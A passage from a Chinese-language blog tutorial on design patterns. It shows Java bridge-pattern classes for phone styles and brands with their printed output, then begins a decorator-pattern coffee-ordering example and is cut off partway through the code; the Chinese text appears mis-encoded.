class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ–°æ·»æ—‹è½¬æ ·å¼æ‰‹æœº</span><br><span class="hljs-comment"> * [io.xtwoy.bridge]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/2 15:06]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SildePhone</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Phone</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SildePhone</span><span class="hljs-params">(Brand brand)</span> &#123;<br>        <span class="hljs-built_in">super</span>(brand);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.open();<br>        System.out.println(<span class="hljs-string">&quot; æ—‹è½¬æ ·å¼æ‰‹æœº &quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.close();<br>        System.out.println(<span class="hljs-string">&quot; æ—‹è½¬æ ·å¼æ‰‹æœº &quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.call();<br>        System.out.println(<span class="hljs-string">&quot; æ—‹è½¬æ ·å¼æ‰‹æœº &quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¢åŠ æ‰‹æœºå“ç‰Œ</p><p><code>iPhone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.bridge]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/2 14:56]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">iPhone</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Brand</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot; è‹¹æœå¼€æœº&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot; è‹¹æœå…³æœº&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot; è‹¹æœæ‰“ç”µè¯&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//è·å–æŠ˜å å¼æ‰‹æœº (æ ·å¼ + å“ç‰Œ )</span><br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br><br>        phone1.open();<br>        phone1.call();<br>        phone1.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vivo</span>());<br><br>        phone2.open();<br>        phone2.call();<br>        phone2.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br><br>        phone3.open();<br>        phone3.call();<br>        phone3.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vivo</span>());<br><br>        phone4.open();<br>        phone4.call();<br>        phone4.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">iPhone</span>());<br><br>        phone5.open();<br>        phone5.call();<br>        phone5.close();<br><br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">Phone</span> <span class="hljs-variable">phone6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">iPhone</span>());<br><br>        phone6.open();<br>        phone6.call();<br>        phone6.close();<br><br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br><br>        <span class="hljs-type">SildePhone</span> <span class="hljs-variable">phone7</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SildePhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br><br>        phone7.open();<br>        phone7.call();<br>        phone7.close();<br><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++++&quot;</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> å°ç±³æ‰‹æœºå¼€æœº </span><br><span class="hljs-code"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºæ‰“ç”µè¯ </span><br><span class="hljs-code"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºå…³æœº </span><br><span class="hljs-section"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-section">++++++++++++++++++++++</span><br><span class="hljs-code"> Vivoæ‰‹æœºå¼€æœº </span><br><span class="hljs-code"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> Vivoæ‰‹æœºæ‰“ç”µè¯ </span><br><span class="hljs-code"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> Vivoæ‰‹æœºå…³æœº </span><br><span class="hljs-section"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> å°ç±³æ‰‹æœºå¼€æœº </span><br><span class="hljs-code"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºæ‰“ç”µè¯ </span><br><span class="hljs-code"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºå…³æœº </span><br><span class="hljs-section"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> Vivoæ‰‹æœºå¼€æœº </span><br><span class="hljs-code"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> Vivoæ‰‹æœºæ‰“ç”µè¯ </span><br><span class="hljs-code"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> Vivoæ‰‹æœºå…³æœº </span><br><span class="hljs-section"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> è‹¹æœå¼€æœº</span><br><span class="hljs-code"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> è‹¹æœæ‰“ç”µè¯</span><br><span class="hljs-code"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> è‹¹æœå…³æœº</span><br><span class="hljs-section"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> è‹¹æœå¼€æœº</span><br><span class="hljs-code"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> è‹¹æœæ‰“ç”µè¯</span><br><span class="hljs-code"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> è‹¹æœå…³æœº</span><br><span class="hljs-section"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-section">++++++++++++++</span><br><span class="hljs-code"> å°ç±³æ‰‹æœºå¼€æœº </span><br><span class="hljs-code"> æ—‹è½¬æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºæ‰“ç”µè¯ </span><br><span class="hljs-code"> æ—‹è½¬æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºå…³æœº </span><br><span class="hljs-section"> æ—‹è½¬æ ·å¼æ‰‹æœº </span><br><span class="hljs-section">++++++++++++++</span><br></code></pre></td></tr></table></figure><p>æ–°çš„ç±»å›¾</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102151322485.png" alt="image-20230102151322485" /></p><h3 id="æ¡¥æ¥æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#æ¡¥æ¥æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> æ¡¥æ¥æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h3><ol><li><p>å®ç°äº†æŠ½è±¡å’Œå®ç°éƒ¨åˆ†çš„åˆ†ç¦»ï¼Œä»è€Œæå¤§çš„æä¾›äº†ç³»ç»Ÿçš„çµæ´»æ€§ï¼Œè®©æŠ½è±¡éƒ¨åˆ†å’Œå®ç°éƒ¨åˆ†ç‹¬ç«‹å¼€æ¥ï¼Œè¿™æœ‰åŠ©äºç³»ç»Ÿè¿›è¡Œåˆ†å±‚è®¾è®¡ï¼Œä»è€Œäº§ç”Ÿæ›´å¥½çš„ç»“æ„åŒ–ç³»ç»Ÿã€‚</p></li><li><p>å¯¹äºç³»ç»Ÿçš„é«˜å±‚éƒ¨åˆ†ï¼Œåªéœ€è¦çŸ¥é“æŠ½è±¡éƒ¨åˆ†å’Œå®ç°éƒ¨åˆ†çš„æ¥å£å°±å¯ä»¥äº†ï¼Œå…¶å®ƒçš„éƒ¨åˆ†ç”±å…·ä½“ä¸šåŠ¡æ¥å®Œæˆã€‚</p></li><li><p><strong>æ¡¥æ¥æ¨¡å¼æ›¿ä»£å¤šå±‚ç»§æ‰¿æ–¹æ¡ˆ</strong>ï¼Œå¯ä»¥å‡å°‘<strong>å­ç±»çš„ä¸ªæ•°</strong>ï¼Œé™ä½ç³»ç»Ÿçš„ç®¡ç†å’Œç»´æŠ¤æˆæœ¬</p></li><li><p>æ¡¥æ¥æ¨¡å¼çš„å¼•å…¥å¢åŠ äº†ç³»ç»Ÿçš„ç†è§£å’Œè®¾è®¡éš¾åº¦ï¼Œç”±äºèšåˆå…³è”å…³ç³»å»ºç«‹åœ¨æŠ½è±¡å±‚ï¼Œè¦æ±‚å¼€å‘è€…é’ˆå¯¹æŠ½è±¡è¿›è¡Œè®¾è®¡å’Œç¼–ç¨‹</p></li><li><p>æ¡¥æ¥æ¨¡å¼è¦æ±‚<strong>æ­£ç¡®è¯†åˆ«å‡ºç³»ç»Ÿä¸­ä¸¤ä¸ªç‹¬ç«‹å˜åŒ–çš„ç»´åº¦(æŠ½è±¡ã€å’Œå®ç°)</strong>ï¼Œå› æ­¤å…¶ä½¿ç”¨èŒƒå›´æœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œå³éœ€è¦æœ‰è¿™æ ·çš„åº”ç”¨åœºæ™¯ã€‚</p></li><li><p>æ¡¥æ¥æ¨¡å¼å…¶å®ƒåº”ç”¨åœºæ™¯å¯¹äºé‚£äº›ä¸å¸Œæœ›ä½¿ç”¨ç»§æ‰¿æˆ–å› ä¸ºå¤šå±‚æ¬¡ç»§æ‰¿å¯¼è‡´ç³»ç»Ÿç±»çš„ä¸ªæ•°æ€¥å‰§å¢åŠ çš„ç³»ç»Ÿï¼Œæ¡¥æ¥æ¨¡å¼å°¤ä¸ºé€‚ç”¨</p></li></ol><h1 id="è£…é¥°å™¨æ¨¡å¼"><a class="markdownIt-Anchor" href="#è£…é¥°å™¨æ¨¡å¼"></a> <mark>è£…é¥°å™¨æ¨¡å¼</mark></h1><p>è£…é¥°å™¨æ¨¡å¼ï¼ˆDecoratorPatternï¼‰å…è®¸å‘ä¸€ä¸ªç°æœ‰çš„å¯¹è±¡æ·»åŠ æ–°çš„åŠŸèƒ½ï¼ŒåŒæ—¶åˆä¸æ”¹å˜å…¶ç»“æ„ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒæ˜¯ä½œä¸ºç°æœ‰çš„ç±»çš„ä¸€ä¸ªåŒ…è£…ã€‚</p><p>è¿™ç§æ¨¡å¼åˆ›å»ºäº†ä¸€ä¸ªè£…é¥°ç±»ï¼Œç”¨æ¥åŒ…è£…åŸæœ‰çš„ç±»ï¼Œå¹¶åœ¨ä¿æŒç±»æ–¹æ³•ç­¾åå®Œæ•´æ€§çš„å‰æä¸‹ï¼Œæä¾›äº†é¢å¤–çš„åŠŸèƒ½ã€‚</p><h2 id="ä»‹ç»-7"><a class="markdownIt-Anchor" href="#ä»‹ç»-7"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ã€‚å°±å¢åŠ åŠŸèƒ½æ¥è¯´ï¼Œè£…é¥°å™¨æ¨¡å¼ç›¸æ¯”ç”Ÿæˆå­ç±»æ›´ä¸ºçµæ´»ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> ä¸€èˆ¬çš„ï¼Œæˆ‘ä»¬ä¸ºäº†æ‰©å±•ä¸€ä¸ªç±»ç»å¸¸ä½¿ç”¨ç»§æ‰¿æ–¹å¼å®ç°ï¼Œç”±äºç»§æ‰¿ä¸ºç±»å¼•å…¥é™æ€ç‰¹å¾ï¼Œå¹¶ä¸”éšç€æ‰©å±•åŠŸèƒ½çš„å¢å¤šï¼Œå­ç±»ä¼šå¾ˆè†¨èƒ€ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> åœ¨ä¸æƒ³å¢åŠ å¾ˆå¤šå­ç±»çš„æƒ…å†µä¸‹æ‰©å±•ç±»ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> å°†å…·ä½“åŠŸèƒ½èŒè´£åˆ’åˆ†ï¼ŒåŒæ—¶ç»§æ‰¿è£…é¥°è€…æ¨¡å¼ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> 1ã€Component ç±»å……å½“æŠ½è±¡è§’è‰²ï¼Œä¸åº”è¯¥å…·ä½“å®ç°ã€‚ 2ã€ä¿®é¥°ç±»å¼•ç”¨å’Œç»§æ‰¿ Component ç±»ï¼Œå…·ä½“æ‰©å±•ç±»é‡å†™çˆ¶ç±»æ–¹æ³•ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€å­™æ‚Ÿç©ºæœ‰ 72 å˜ï¼Œå½“ä»–å˜æˆ&quot;åº™å®‡&quot;åï¼Œä»–çš„æ ¹æœ¬è¿˜æ˜¯ä¸€åªçŒ´å­ï¼Œä½†æ˜¯ä»–åˆæœ‰äº†åº™å®‡çš„åŠŸèƒ½ã€‚<br />2ã€ä¸è®ºä¸€å¹…ç”»æœ‰æ²¡æœ‰ç”»æ¡†éƒ½å¯ä»¥æŒ‚åœ¨å¢™ä¸Šï¼Œä½†æ˜¯é€šå¸¸éƒ½æ˜¯æœ‰ç”»æ¡†çš„ï¼Œå¹¶ä¸”å®é™…ä¸Šæ˜¯ç”»æ¡†è¢«æŒ‚åœ¨å¢™ä¸Šã€‚åœ¨æŒ‚åœ¨å¢™ä¸Šä¹‹å‰ï¼Œç”»å¯ä»¥è¢«è’™ä¸Šç»ç’ƒï¼Œè£…åˆ°æ¡†å­é‡Œï¼›è¿™æ—¶ç”»ã€ç»ç’ƒå’Œç”»æ¡†å½¢æˆäº†ä¸€ä¸ªç‰©ä½“ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> è£…é¥°ç±»å’Œè¢«è£…é¥°ç±»å¯ä»¥ç‹¬ç«‹å‘å±•ï¼Œä¸ä¼šç›¸äº’è€¦åˆï¼Œè£…é¥°æ¨¡å¼æ˜¯ç»§æ‰¿çš„ä¸€ä¸ªæ›¿ä»£æ¨¡å¼ï¼Œè£…é¥°æ¨¡å¼å¯ä»¥åŠ¨æ€æ‰©å±•ä¸€ä¸ªå®ç°ç±»çš„åŠŸèƒ½ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> å¤šå±‚è£…é¥°æ¯”è¾ƒå¤æ‚ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€æ‰©å±•ä¸€ä¸ªç±»çš„åŠŸèƒ½ã€‚ 2ã€åŠ¨æ€å¢åŠ åŠŸèƒ½ï¼ŒåŠ¨æ€æ’¤é”€ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> å¯ä»£æ›¿ç»§æ‰¿ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102172346775.png" alt="image-20230102172346775" /></p><p>åˆçœ‹ä¸Šå›¾æ„Ÿè§‰è£…é¥°å™¨æ¨¡å¼æœ‰ç‚¹åƒä¿„ç½—æ–¯å¥—å¨ƒï¼Œâ½½è£…é¥°å™¨çš„æ ¸â¼¼å°±æ˜¯å†ä¸æ”¹åŸæœ‰ç±»çš„åŸºç¡€ä¸Šç»™ç±»æ–°å¢åŠŸèƒ½ã€‚<strong>ä¸æ”¹å˜åŸæœ‰ç±»</strong>ï¼Œå¯èƒ½æœ‰çš„â¼©ä¼™ä¼´ä¼šæƒ³åˆ°ç»§æ‰¿ã€AOPåˆ‡â¾¯ï¼Œå½“ç„¶è¿™äº›â½…å¼éƒ½å¯ä»¥å®ç°ï¼Œä½†æ˜¯ä½¿â½¤è£…é¥°å™¨æ¨¡å¼ä¼šæ˜¯å¦å¤–â¼€ç§æ€è·¯æ›´ä¸ºçµæ´»ï¼Œå¯ä»¥é¿å…ç»§æ‰¿å¯¼è‡´çš„â¼¦ç±»è¿‡å¤šï¼Œä¹Ÿå¯ä»¥é¿å…AOPå¸¦æ¥çš„å¤æ‚æ€§ã€‚</p><h2 id="å®ç°-5"><a class="markdownIt-Anchor" href="#å®ç°-5"></a> å®ç°</h2><p>æ˜Ÿå·´å…‹å’–å•¡è®¢å•é¡¹ç›®ï¼ˆå’–å•¡é¦†ï¼‰ï¼š</p><ol><li><p>å’–å•¡ç§ç±»/å•å“å’–å•¡ï¼šEspresso(æ„å¤§åˆ©æµ“å’–å•¡)ã€ShortBlackã€LongBlack(ç¾å¼å’–å•¡)ã€Decaf(æ— å› å’–å•¡)ã€‚</p></li><li><p>è°ƒæ–™ï¼šMilkã€Soy(è±†æµ†)ã€Chocolateã€‚</p></li><li><p>è¦æ±‚åœ¨æ‰©å±•æ–°çš„å’–å•¡ç§ç±»æ—¶ï¼Œå…·æœ‰è‰¯å¥½çš„æ‰©å±•æ€§ã€æ”¹åŠ¨æ–¹ä¾¿ã€ç»´æŠ¤æ–¹ä¾¿ã€‚</p></li><li><p>ä½¿ç”¨ OO çš„æ¥è®¡ç®—ä¸åŒç§ç±»å’–å•¡çš„è´¹ç”¨: å®¢æˆ·å¯ä»¥ç‚¹å•å“å’–å•¡ï¼Œä¹Ÿå¯ä»¥å•å“å’–å•¡+è°ƒæ–™ç»„åˆã€‚</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102173756821.png" alt="image-20230102173756821" /></p><p>ä¸€éƒ¨åˆ†ä»£ç </p><p><code>Drink</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Drink</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String des; <span class="hljs-comment">// æè¿°</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">float</span> <span class="hljs-variable">price</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.0f</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDes</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> des;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDes</span><span class="hljs-params">(String des)</span> &#123;<br>        <span class="hljs-built_in">this</span>.des = des;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> price;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">float</span> price)</span> &#123;<br>        <span class="hljs-built_in">this</span>.price = price;<br>    &#125;<br><br>    <span class="hljs-comment">//è®¡ç®—è´¹ç”¨çš„æŠ½è±¡æ–¹æ³•</span><br>    <span class="hljs-comment">//å­ç±»æ¥å®ç°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-type">float</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Coffee</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Coffee</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Drink</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">float</span> <span class="hljs-title function_">cost</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getPrice();<br>   &#125;<br><br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>LongBlack</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.decorator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongBlack</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Coffee</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">LongBlack</span><span class="hljs-params">()</span> &#123;<br>      setDes(<span class="hljs-string">&quot; longblack &quot;</span>);<br>      